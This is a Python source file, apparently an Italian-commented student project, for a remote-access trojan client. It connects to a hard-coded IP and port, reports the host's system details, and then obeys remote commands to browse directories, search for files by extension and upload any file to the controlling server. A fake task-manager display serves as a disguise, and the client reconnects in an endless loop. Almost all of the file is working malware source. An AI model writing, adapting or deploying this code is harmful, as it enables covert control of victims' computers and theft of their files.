import os
import pickle
import sys
from socket import *
import platform
import psutil
import time
import signal
from os import system
import traceback
from traceback import print_exc

IP = "192.168.5.95"
PORT = 8082  # Porta di Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"


# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


# OK comportamento da trojan
def trojanBehaviour():
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            processes_count = 0
            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
            print("              --     Task manager: Current state of usage      --\n\n")
            # facciamo un display a video dell'utilizzo
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),
                                                                                                              int(ram),
                                                                                                              int(disk),
                                                                                                              processes_count))
            print("              --------------------------------------------------------- ")
            time.sleep(1)
            clearScreen()
        except:
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")


# OK creazione connessione
def clientConnection():
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(ADDR)
        print(f"[CONNECTED] Connessione avvenuta\n")
        return client
    except:
        print(f"[ERROR] Connessione non riuscita: riprovo tra 10 secondi...\n")
        return "errore"


#  manda le informazioni base
def sendInfo(client):
    mando = 1
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            time.sleep(5)
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                mando=0
            else:
                risposta = "null"
                while risposta != '0' and risposta != '1':
                    client.send(("[ERROR] Dati non mandati correttamente, riprovare? 1-Y/0-N ").encode(FORMAT))
                    risposta = client.recv(1024).decode(FORMAT)
                    if risposta == '1':
                        mando = 1
                    elif risposta == '0':
                        mando = 0


def filespath(tipologia, client):

    result = ["Lista dei risultati per estensione " + tipologia + "\n\n"]

    if platform.system() == "Darwin":
        print("sistema riconosciuto")
        print("tipologia: "+tipologia)
        for cartella, sottocartelle, file in os.walk(r"/Users/erasmo/Desktop"):
            for item in file:
                if item.endswith(tipologia):
                    print("ho trovato il file: "+item)
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(item) + "\n")

    elif platform.system() == "Windows":
        for cartella, sottocartelle, file in os.walk(r"C:\Users\*\Desktop"):
            for item in file:
                if item.endswith(tipologia):
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")

    elif platform.system() == "Linux":
        for cartella, sottocartelle, file in os.walk(r"/mnt/"):
            for item in file:
                if item.endswith(tipologia):
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")

    result = ''.join(result)

    try:
        filesize = sys.getsizeof(result)
        client.send((str(filesize)).encode(FORMAT))
        time.sleep(3)
        client.send((result).encode(FORMAT))

    except:
        traceback.print_exc()
        client.send(("Download fallito").encode(FORMAT))
#cerco tutti i file con estensione indicata in un certo path
def find(comando, client):
    try:
        counter_punti=0
        counter_spazi=0
        inizio_ext=0
        fine_ext=0
        inizio_path=0
        for element in range(0, len(comando)):
            if comando[element] == ".":
                counter_punti += 1
                if counter_punti == 1:
                    inizio_ext = element
                elif counter_punti == 2:
                    inizio_path = element
            if comando[element] == " ":
                counter_spazi += 1
                if counter_spazi == 2:
                    fine_ext = element
                    inizio_path = element + 1
        estensione=comando[inizio_ext:fine_ext]
        path=comando[inizio_path:]
        genericlist=os.listdir(path)
        specificlist = []
        for item in genericlist:
            if item.endswith(estensione):
                specificlist.append(item)
        data = pickle.dumps(specificlist)
        client.send(("Dati in arrivo...").encode(FORMAT))
        client.send(data)
    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            client.send(("Connessione interrotta").encode(FORMAT))
        else:
            client.send(("Si è verificato un errore, verifica il comando").encode(FORMAT))
def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            client.send((os.getcwd()).encode(FORMAT))
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(0.5)
            if comando[0:8] == "download":
                try:
                    filename = comando[10:len(comando) - 1]
                    filesize = os.path.getsize(filename)
                    with open(filename, 'rb') as f:
                        line = f.read(filesize)
                        client.send((str(filesize)).encode(FORMAT))
                        time.sleep(3)
                        client.send(line)
                        f.close()
                except:
                    client.send(("Download fallito").encode(FORMAT))

            elif comando[0:5] == "cd ..":
                os.chdir("..")
            elif comando[0:2] == "cd":
                path = comando[3:]
                os.chdir(os.getcwd() + "/" + path)
            elif comando[0:2] == "ls":
                if len(comando) == 2:
                    # ritorna una lista
                    listdir = os.listdir()
                    # faccio un dump per poterla inoltrare
                    data = pickle.dumps(listdir)
                    client.send(data)
                    time.sleep(1.5)
                else:
                    comandorisolto = comando.split()
                    path = comandorisolto[1]
                    listdir = os.listdir(path)
                    data = pickle.dumps(listdir)
                    client.send(data)
                    time.sleep(1.5)
            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))
                time.sleep(1.5)
            elif comando[0:9] == "filespath":
                estensione = comando[10:]
                filespath(estensione, client)
                time.sleep(1.5)
            elif comando[0:4] == "find":
                find(comando, client)
                time.sleep(1.5)
            elif comando[0:4] == "info":
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))
                time.sleep(1.5)
            # else comandi già interpretati dal sistema (controllo diretto sul terminale)
        except Exception as e:
            client.send(("[ERROR] Command " + comando + " not found ...\n").encode(FORMAT))
            comando = "null"
            if e.__class__.__name__== "ConnectionResetError":
                comando="exit"

def main():
    try:
        signal.signal(signal.SIGINT, signalHandler)
        client = clientConnection()
        client.setblocking(True)
        if client == "errore":
            raise Exception
        else:
            print(f"[SENDING] Invio informazioni sul mio sistema al server\n")
            sendInfo(client)
            time.sleep(2)

            try:
                openRemoteControl(client)
                time.sleep(2)
            except Exception as e:
                if e.__class__.__name__ == "ConnectionResetError":
                    print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
                    raise e
                raise e

            client.setblocking(False)
            client.send(1024)
            client.close()

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            raise e
        raise e

# start trojan
# thread_trojan=Thread(target=trojanBehaviour)
# thread_trojan.start()
# thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            print(f"[CONNECTION SEARCH] Sto cercando una connessione\n")
            t_end = time.time() + 5
            while time.time() < t_end:
                clearScreen()
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)
                clearScreen()
            main()
        except:
            print(f"[RECONNECTION] Cerco un server a cui connettermi\n")
            t_end = time.time() + 7
            while time.time() < t_end:
                clearScreen()
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)
                clearScreen()
